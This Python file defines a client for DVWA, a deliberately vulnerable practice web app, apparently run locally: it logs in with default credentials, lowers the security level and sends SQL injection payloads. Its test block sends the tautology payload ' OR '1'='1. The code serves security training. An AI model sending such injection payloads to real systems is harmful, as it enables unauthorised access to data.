import requests
from bs4 import BeautifulSoup
from typing import Optional


class DVWAClient:
    """
    Simple HTTP client for DVWA that supports:
    - login
    - setting security level
    - performing SQLi requests
    """

    def __init__(
        self,
        base_url: str = "http://127.0.0.1:4280",
        username: str = "admin",
        password: str = "password",
    ):
        self.base_url = base_url.rstrip("/")
        self.username = username
        self.password = password
        self.session = requests.Session()

        self.login_url = f"{self.base_url}/login.php"
        self.sqli_url = f"{self.base_url}/vulnerabilities/sqli/"
        self.security_url = f"{self.base_url}/security.php"

    # ---------- Utility methods ----------

    @staticmethod
    def _get_token(html: str, token_name: str = "user_token") -> str:
        soup = BeautifulSoup(html, "html.parser")
        token_tag = soup.find("input", {"name": token_name})
        if not token_tag:
            raise ValueError("CSRF token not found")
        return token_tag.get("value")

    # ---------- Core actions ----------

    def login(self) -> bool:
        """
        Log in to DVWA. Returns True on success.
        """
        # Get login page for CSRF token
        r = self.session.get(self.login_url)
        r.raise_for_status()
        token = self._get_token(r.text)

        data = {
            "username": self.username,
            "password": self.password,
            "Login": "Login",
            "user_token": token,
        }
        r = self.session.post(self.login_url, data=data)
        r.raise_for_status()

        if "Login failed" in r.text:
            print("[DVWAClient] Login failed")
            return False

        print("[DVWAClient] Logged in")
        return True

    def set_security_level(self, level: str = "low") -> bool:
        """
        Set DVWA security level via the UI.
        Levels: 'low', 'medium', 'high', 'impossible'
        """
        # Get security page (to fetch token)
        r = self.session.get(self.security_url)
        r.raise_for_status()

        token = self._get_token(r.text)

        data = {
            "security": level,
            "seclev_submit": "Submit",
            "user_token": token,
        }
        r = self.session.post(self.security_url, data=data)
        r.raise_for_status()

        # Also set cookie explicitly, just in case
        self.session.cookies.set("security", level, domain="127.0.0.1", path="/")

        print(f"[DVWAClient] Security level set to {level}")
        return True

    def sqli_request(self, payload: str) -> str:
        """
        Perform a SQLi request with the given payload.
        Returns the response HTML as string.
        """
        params = {
            "id": payload,
            "Submit": "Submit",
        }
        r = self.session.get(self.sqli_url, params=params)
        r.raise_for_status()
        return r.text


# Simple manual test
if __name__ == "__main__":
    client = DVWAClient()
    if client.login():
        client.set_security_level("low")
        html = client.sqli_request("' OR '1'='1")
        print("[*] Response length:", len(html))
